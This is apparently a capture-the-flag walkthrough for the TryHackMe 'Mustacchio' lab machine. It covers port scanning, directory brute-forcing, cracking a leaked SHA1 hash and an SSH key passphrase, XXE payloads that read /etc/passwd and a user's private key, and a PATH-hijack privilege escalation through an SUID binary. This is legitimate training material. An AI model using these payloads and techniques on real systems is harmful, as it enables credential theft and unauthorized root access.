---
title: Walkthrough - Mustacchio
published: true
---

XXE, Enumeration, PrivEsc, Web, PATH. Boot2Root Machine

[https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)

* * *

## Notes

- ``sudo nmap -Pn -sS -p- -T4 10.10.12.244 -vvv``

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Mustacchio | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- pretty standardish website on port 80 not much to see here by an initial look. nothing in the source codes.

- ``gobuster dir -u http://10.10.12.244/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt -t 100 --no-error``

- our gobuster scan finds us ``/custom/`` that has ``/js/`` which contains a ``users.bak`` file. Downloading that and checking it out we find credentials for admin with a SHA1 hash. Crack with hashcat and rockyou ``hashcat -m 100 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b /usr/share/seclists/Passwords/rockyou.txt``

- port 8765 we have a login page we can use these credentials ``admin:bulldog19``
- the source code on ``home.php`` someone left us a comment ``<!-- Barry, you can now SSH in using your key!-->``
- upon submission we also find the location of another ``.bak``, ``dontforget.bak`` which gives us an xml comment and also submitting the form black gives us an alert telling us to submit an xml code.
- pasting the xml from ``dontforget.bak`` lets us see how the code is working.
- we can alter the code in order to give us system information.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&xxe;</name>
  <author>0xskar</author>
  <com>hacked</com>
</comment> 
```

- since we have a hint that barry can login to the server with his rsa key lets get that to our system

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&xxe;</name>
  <author>0xskar</author>
  <com>hacked</com>
</comment> 
```

- save the rsa to a file and ``ssh2john``. Crack using rockyou and ``john``. and we recieve ``urieljames`` for the credentials.

- login to ssh with the key and pass to get our user flag.

* * * 

## What is the user flag?

![0xskar](/assets/mustacchio02.png)

* * * 

## What is the root flag?

- ``find / -perm -u=s -type f 2>/dev/null`` we find a file with suid set ``home/joe/live_log``
- this is an ELF, lets get it over to our machine and try to check it out in Ghidra.

it has a main function that used ``tail`` to display the nginx logs. we can also see this by running ``strings``

because this function calls just ``tail`` and not its full path we can do a ``path`` exploit

- create path 

```
barry@mustacchio:/var/log$ cd ~
barry@mustacchio:~$ export PATH=$PWD:$PATH
barry@mustacchio:~$ echo $PATH
/home/barry:/var/log:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

- create ``tail`` in path

```
barry@mustacchio:~$ vi tail
barry@mustacchio:~$ cat tail
#!/usr/bin/python3
import pty
pty.spawn("/bin/bash")
barry@mustacchio:~$ chmod +x tail
barry@mustacchio:~$ /home/joe/live_log 
root@mustacchio:~# 
```

* * * 

